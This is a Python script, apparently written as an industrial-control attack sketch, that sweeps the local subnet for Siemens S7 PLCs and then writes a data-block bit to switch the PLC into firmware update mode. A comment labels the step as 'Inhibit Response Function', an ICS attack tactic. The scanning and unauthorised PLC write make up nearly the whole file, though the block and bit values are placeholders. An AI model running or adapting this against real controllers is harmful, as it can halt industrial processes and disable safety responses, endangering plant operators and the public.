import snap7
import socket
import struct
import time
import subprocess  # Used for external commands like ping

# Configuration
PLC_IP_ADDRESS = None  # Initially unknown, will be discovered
PLC_RACK = 0
PLC_SLOT = 1
S7_PORT = 102  # Standard S7 port

# Define the variables related to the firmware update mode.  These will vary
# depending on the specific PLC and firmware.  This is an example!
FIRMWARE_UPDATE_DB_NUMBER = 100  # Example Data Block number
FIRMWARE_UPDATE_MODE_BYTE = 0      # Byte offset in the DB
FIRMWARE_UPDATE_MODE_BIT = 0       # Bit offset in the byte (0-7)
FIRMWARE_UPDATE_ACTIVE_VALUE = True #Value used for activation, example is boolean
FIRMWARE_UPDATE_INACTIVE_VALUE = False  # Value used for inactivation

def find_plc_ip():
    """
    Attempts to discover the PLC's IP address by pinging the network
    and checking for S7 responses.  This is a VERY basic discovery
    method and may require modification based on your network setup.

    Returns:
        str: The IP address of the PLC if found, otherwise None.
    """

    # Get the IP address of the workstation
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))  # Doesn't actually connect to the internet, just extracts local IP
        workstation_ip = s.getsockname()[0]
        s.close()
    except socket.error as e:
        print(f"Error getting workstation IP: {e}")
        return None

    # Extract the network portion of the IP address (e.g., 192.168.1.0)
    network_address = ".".join(workstation_ip.split(".")[:-1]) + ".0"

    print(f"Scanning network {network_address} for PLC...")

    # Iterate through a range of possible host addresses (1-254).
    #  Consider making this range configurable.  Be mindful of network traffic.
    for host in range(1, 255):
        ip_address = f"{network_address}.{host}"
        print(f"Trying {ip_address}...")
        try:
            # First, ping the address to see if it responds. This is faster.
            ping_result = subprocess.run(["ping", "-n", "1", "-w", "100", ip_address], capture_output=True)  # Windows
            if ping_result.returncode == 0:  # Ping successful
                print(f"Ping to {ip_address} successful. Trying S7 connection...")
                # Attempt an S7 connection.  This is a rudimentary check.
                client = snap7.client.Client()
                client.set_timeout(100) #Set a 100ms timeout
                client.connect(ip_address, PLC_RACK, PLC_SLOT)
                try:
                    # Try a simple read to confirm S7 connection.
                    # Reading a byte from DB1 is usually a safe bet to test.
                    client.db_read(1, 0, 1) # Read one byte from DB1 at offset 0
                    print(f"S7 Connection to {ip_address} successful!")
                    client.disconnect()
                    return ip_address  # Found the PLC!
                except Exception as e:
                    print(f"S7 Connection to {ip_address} failed: {e}")
                    client.disconnect()
            else:
                print(f"Ping to {ip_address} failed.")

        except Exception as e:
            print(f"Error scanning {ip_address}: {e}")

    print("PLC not found on the network.")
    return None



def set_firmware_update_mode(client, activate=True):
    """
    Sets the firmware update mode on the PLC.

    Args:
        client (snap7.client.Client):  The connected Snap7 client object.
        activate (bool): True to activate firmware update mode, False to deactivate.
    """
    db_number = FIRMWARE_UPDATE_DB_NUMBER
    start = FIRMWARE_UPDATE_MODE_BYTE
    size = 1

    try:
        # Read the existing byte from the DB
        read_data = client.db_read(db_number, start, size)

        # Modify the bit representing firmware update mode
        byte_value = read_data[0]  # Get the byte value

        if activate:
            if FIRMWARE_UPDATE_ACTIVE_VALUE:
                byte_value |= (1 << FIRMWARE_UPDATE_MODE_BIT) # Set the bit
            else:
                raise ValueError("The Active value must be set to True, it is set to false")

        else:
            if FIRMWARE_UPDATE_INACTIVE_VALUE == False:
                byte_value &= ~(1 << FIRMWARE_UPDATE_MODE_BIT) # Clear the bit
            else:
                raise ValueError("The Inactive value must be set to False, it is set to True")

        # Prepare the data to write back to the PLC
        write_data = bytearray([byte_value])

        # Write the modified byte back to the DB
        client.db_write(db_number, start, write_data)

        if activate:
            print(f"Firmware update mode activated on PLC at {PLC_IP_ADDRESS} (DB{db_number}.DBB{start}.{FIRMWARE_UPDATE_MODE_BIT})")
        else:
            print(f"Firmware update mode deactivated on PLC at {PLC_IP_ADDRESS} (DB{db_number}.DBB{start}.{FIRMWARE_UPDATE_MODE_BIT})")


    except Exception as e:
        print(f"Error setting firmware update mode: {e}")



def main():
    global PLC_IP_ADDRESS

    # 1. Discover the PLC's IP address
    if not PLC_IP_ADDRESS:
        PLC_IP_ADDRESS = find_plc_ip()

    if not PLC_IP_ADDRESS:
        print("Could not determine PLC IP address. Exiting.")
        return

    print(f"Using PLC IP address: {PLC_IP_ADDRESS}")


    # 2. Connect to the PLC
    client = snap7.client.Client()
    try:
        client.connect(PLC_IP_ADDRESS, PLC_RACK, PLC_SLOT)
        print(f"Connected to PLC at {PLC_IP_ADDRESS}")

        #3.  Inhibit Response Function - Activate Firmware Update Mode
        # Activate firmware update mode
        set_firmware_update_mode(client, activate=True)  #Place into firmware update mode

        #Optional: You might want to wait a bit to ensure the mode takes effect.
        time.sleep(5)

        #Deactivate firmware update mode
        set_firmware_update_mode(client, activate=False) #Take it out of firmware update mode

    except Exception as e:
        print(f"Error connecting to PLC: {e}")
    finally:
        if client.get_connected():
            client.disconnect()
            print("Disconnected from PLC.")



if __name__ == "__main__":
    main()